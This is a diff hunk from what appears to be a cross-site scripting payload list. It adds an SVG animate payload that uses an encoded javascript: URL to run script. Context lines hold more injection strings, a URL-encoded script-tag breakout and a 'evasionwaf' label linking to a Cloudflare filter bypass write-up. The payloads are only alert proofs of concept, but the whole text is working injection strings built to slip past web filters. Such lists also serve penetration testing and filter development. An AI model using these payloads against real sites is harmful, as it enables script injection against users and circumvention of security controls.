@@ -30,6 +30,8 @@ pjavascriptt:confirm`0`
 
 ?s=%22%2F%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
 
+<svg><animate xlink:href=#x attributeName=href values=&#106;avascript:alert(1) /><a id=x><rect width=100 height=100 /></a>
+
 evasionwaf
 https://0xjin.medium.com/new-xss-bypass-cloudflare-filters-2a878c01d312
 
